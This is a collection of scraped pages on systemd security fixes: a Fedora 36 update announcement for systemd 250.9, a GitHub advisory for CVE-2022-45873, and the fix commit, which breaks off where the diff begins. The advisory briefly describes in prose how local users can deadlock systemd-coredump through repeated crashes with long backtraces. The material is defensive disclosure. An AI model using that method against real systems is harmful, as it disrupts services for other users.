* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF.mbox.gz?message=MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF/#MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF)

# [SECURITY] Fedora 36 Update: systemd-250.9-1.fc36

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updatesÔº†fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updatesÔº†fedoraproject.org")

31 Dec
2022

31 Dec
'22

1:16 a.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2022-ef4f57b072
2022-12-31 01:16:00.044279
--------------------------------------------------------------------------------

Name : systemd
Product : Fedora 36
Version : 250.9
Release : 1.fc36
URL : <https://www.freedesktop.org/wiki/Software/systemd>
Summary : System and Service Manager
Description :
systemd is a system and service manager that runs as PID 1 and starts the rest
of the system. It provides aggressive parallelization capabilities, uses socket
and D-Bus activation for starting services, offers on-demand starting of
daemons, keeps track of processes using Linux control groups, maintains mount
and automount points, and implements an elaborate transactional dependency-based
service control logic. systemd supports SysV and LSB init scripts and works as a
replacement for sysvinit. Other parts of this package are a logging daemon,
utilities to control basic system configuration like the hostname, date, locale,
maintain a list of logged-in users, system accounts, runtime directories and
settings, and a logging daemons.

This package was built from the 250.9-stable branch of systemd.

--------------------------------------------------------------------------------
Update Information:

- Latest bugfix release with a bunch of fixes (homed, networkd, manager,
resolved, documentation): rhbz#2133792, rhbz#2135778, rhbz#2152685, and also
#2031810, #2121106. - CVE-2022-4415: systemd: coredump not respecting
fs.suid\_dumpable kernel setting No need to log out or reboot.
--------------------------------------------------------------------------------
ChangeLog:

--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2133792 - StartTransientUnitContext as unprivileged user fails with slice already existing
<https://bugzilla.redhat.com/show_bug.cgi?id=2133792>
[ 2 ] Bug #2135778 - systemd-coredump times out while processing a crash, gdb can't attach to a stuck process
<https://bugzilla.redhat.com/show_bug.cgi?id=2135778>
[ 3 ] Bug #2149066 - CVE-2022-45873 systemd: deadlock in systemd-coredump via a crash with a long backtrace [fedora-all]
<https://bugzilla.redhat.com/show_bug.cgi?id=2149066>
[ 4 ] Bug #2152685 - systemdcoredump: invalid char in logs
<https://bugzilla.redhat.com/show_bug.cgi?id=2152685>
[ 5 ] Bug #2155521 - CVE-2022-4415 systemd: local information leak due to systemd-coredump not respecting fs.suid\_dumpable kernel setting [fedora-36]
<https://bugzilla.redhat.com/show_bug.cgi?id=2155521>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2022-ef4f57b072' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF/#MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from github.com_c8a006aa_20250115_114658.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-3w8w-mhj7-j5rc)

**CVE-2022-45873**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-3w8w-mhj7-j5rc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2022-45873](/advisories/GHSA-3w8w-mhj7-j5rc)

## systemd 250 and 251 allows local users to achieve a...

Moderate severity

Unreviewed

Published
Nov 24, 2022
to the GitHub Advisory Database
‚Ä¢
Updated Jan 30, 2023

## Package

No package listed‚Äî
[Suggest a package](/advisories/GHSA-3w8w-mhj7-j5rc/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

systemd 250 and 251 allows local users to achieve a systemd-coredump deadlock by triggering a crash that has a long backtrace. This occurs in parse\_elf\_object in shared/elf-util.c. The exploitation methodology is to crash a binary calling the same function recursively, and put it in a deeply nested directory to make its backtrace large enough to cause the deadlock. This must be done 16 times when MaxConnections=16 is set for the systemd/units/systemd-coredump.socket file.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2022-45873>
* [systemd/systemd#25055 (comment)](https://github.com/systemd/systemd/pull/25055#issuecomment-1313733553)
* [systemd/systemd@076b807](https://github.com/systemd/systemd/commit/076b807be472630692c5348c60d0c2b7b28ad437)
* [systemd/systemd#24853 (comment)](https://github.com/systemd/systemd/pull/24853#issuecomment-1326561497)
* [https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF/](https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF/)

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2022-45873)
Nov 23, 2022

Published to the GitHub Advisory Database
Nov 24, 2022

Last updated
Jan 30, 2023

### Severity

Moderate

5.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
None

Integrity
None

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

0.042%
 (5th percentile)

### Weaknesses

[CWE-400](/advisories?query=cwe%3A400)

### CVE ID

CVE-2022-45873

### GHSA ID

GHSA-3w8w-mhj7-j5rc

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-3w8w-mhj7-j5rc/improve).

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_5db6012c_20250114_193408.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fcommit%2F076b807be472630692c5348c60d0c2b7b28ad437)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fcommit%2F076b807be472630692c5348c60d0c2b7b28ad437)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=systemd%2Fsystemd)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[systemd](/systemd)
/
**[systemd](/systemd/systemd)**
Public

* [Notifications](/login?return_to=%2Fsystemd%2Fsystemd) You must be signed in to change notification settings
* [Fork
  3.9k](/login?return_to=%2Fsystemd%2Fsystemd)
* [Star
   13.6k](/login?return_to=%2Fsystemd%2Fsystemd)

* [Code](/systemd/systemd)
* [Issues
  2.3k](/systemd/systemd/issues)
* [Pull requests
  343](/systemd/systemd/pulls)
* [Actions](/systemd/systemd/actions)
* [Security](/systemd/systemd/security)
* [Insights](/systemd/systemd/pulse)

Additional navigation options

* [Code](/systemd/systemd)
* [Issues](/systemd/systemd/issues)
* [Pull requests](/systemd/systemd/pulls)
* [Actions](/systemd/systemd/actions)
* [Security](/systemd/systemd/security)
* [Insights](/systemd/systemd/pulse)

## Commit

[Permalink](/systemd/systemd/commit/076b807be472630692c5348c60d0c2b7b28ad437)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

coredump: avoid deadlock when passing processed backtrace data

[Browse files](/systemd/systemd/tree/076b807be472630692c5348c60d0c2b7b28ad437)
Browse the repository at this point in the history

```
We would deadlock when passing the data back from the forked-off process that
was doing backtrace generation back to the coredump parent. This is because we
fork the child and wait for it to exit. The child tries to write too much data
to the output pipe, and and after the first 64k blocks on the parent because
the pipe is full. The bug surfaced in Fedora because of a combination of four
factors:
- [8770778](https://github.com/systemd/systemd/commit/87707784c70dc9894ec613df0a6e75e732a362a3) was backported to v251.5, which
  allowed coredump processing to be successful.
- [1a0281a](https://github.com/systemd/systemd/commit/1a0281a3ebf4f8c16d40aa9e63103f16cd23bb2a) was NOT backported, so the output
  was very verbose.
- Fedora has the ELF package metadata available, so a lot of output can be
  generated. Most other distros just don't have the information.
- gnome-calendar crashes and has a bazillion modules and 69596 bytes of output
  are generated for it.

Fixes <https://bugzilla.redhat.com/show_bug.cgi?id=2135778>.

The code is changed to try to write data opportunistically. If we get partial
information, that is still logged. In is generally better to log partial
backtrace information than nothing at all.
```

* Loading branch information

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)

[keszybz](/systemd/systemd/commits?author=keszybz "View all commits by keszybz")
committed
Oct 19, 2022

1 parent
[87a16eb](/systemd/systemd/commit/87a16eb8b54002a49f12944fc09ce45d0cbadf45)

commit 076b807

Showing
**1 changed file**
with
**31 additions**
and
**6 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

37 changes: 31 additions & 6 deletions

37
[src/shared/elf-util.c](#diff-68e05e4a54584d8ec86b222141102762daf72f8bb01176197350f1e5b1f3455d "src/shared/elf-util.c")

Show comments

[View file](/systemd/systemd/blob/076b807be472630692c5348c60d0c2b7b28ad437/src/shared/elf-util.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -30,6 +30,9 @@ |
|  |  | #define THREADS\_MAX 64 |
